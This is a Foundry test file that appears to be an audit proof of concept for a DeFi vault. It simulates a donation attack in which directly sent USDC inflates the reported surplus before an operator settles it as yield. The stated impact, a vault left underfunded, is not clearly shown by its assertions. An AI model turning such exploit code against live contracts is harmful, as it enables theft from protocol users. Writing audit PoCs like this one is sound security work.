// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/YieldEscrow.sol";

// ATTACK TIMELINE:
// 1. [Setup] SimulatorBase deploys protocol. Attacker is funded with USDC.
// 2. [T=1] Attacker transfers USDC directly to Vault contract (transient donation).
// 3. [T=2] distributableSurplus() is inflated due to raw USDC balance increase.
// 4. [T=3] Operator calls vault.settle() with the inflated surplus as proposedYield.
// 5. [Assert] Verify yield was distributed, leaving the vault underfunded relative to real backing.

contract AuditAgentPoC is SimulatorBase {
    address attacker = address(0xdead);

    function setUp() public override {
        super.setUp();
    }

    function test_exploit() public {
        // 1. Setup: Fund attacker with USDC
        uint256 donationAmount = 1_000_000e6; // 1M USDC
        deal(address(usdc), attacker, donationAmount);

        // Initial state
        int256 surplusBefore = accountant.distributableSurplus();
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));

        console.log("Step 1: surplusBefore =", uint256(surplusBefore));
        console.log("Step 1: vaultUsdcBefore =", vaultUsdcBefore);

        // 2. Attacker flash-donates USDC directly to Vault
        vm.prank(attacker);
        usdc.transfer(address(vault), donationAmount);

        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
        int256 surplusAfterDonation = accountant.distributableSurplus();

        console.log("Step 2: vaultUsdcAfter =", vaultUsdcAfter);
        console.log("Step 2: surplusAfterDonation =", uint256(surplusAfterDonation));

        // The surplus should be inflated by the donation amount
        assertGt(surplusAfterDonation, surplusBefore, "Surplus not inflated by donation");

        // 3. Operator settles daily PnL with the inflated surplus
        uint256 proposedYield = uint256(surplusAfterDonation);

        // Advance time to pass minSettlementInterval
        uint256 interval = accountant.minSettlementInterval();
        vm.warp(block.timestamp + interval + 1);

        vm.prank(operator);
        vault.settle(proposedYield);

        // 4. Assert: The vault distributed yield based on the transient donation
        uint256 vaultUsdcFinal = usdc.balanceOf(address(vault));
        int256 surplusFinal = accountant.distributableSurplus();

        console.log("Step 4: vaultUsdcFinal =", vaultUsdcFinal);
        console.log("Step 4: surplusFinal =", uint256(surplusFinal));

        // The vault lost the donated USDC to yield distribution
        assertLt(vaultUsdcFinal, vaultUsdcAfter, "Vault did not distribute the donated USDC as yield");

        // The real backing is now deficient because the donated USDC was given away
        uint256 yieldEscrowBal = usdc.balanceOf(address(yieldEscrow));
        assertGt(yieldEscrowBal, 0, "Yield escrow did not receive the inflated yield");
    }
}
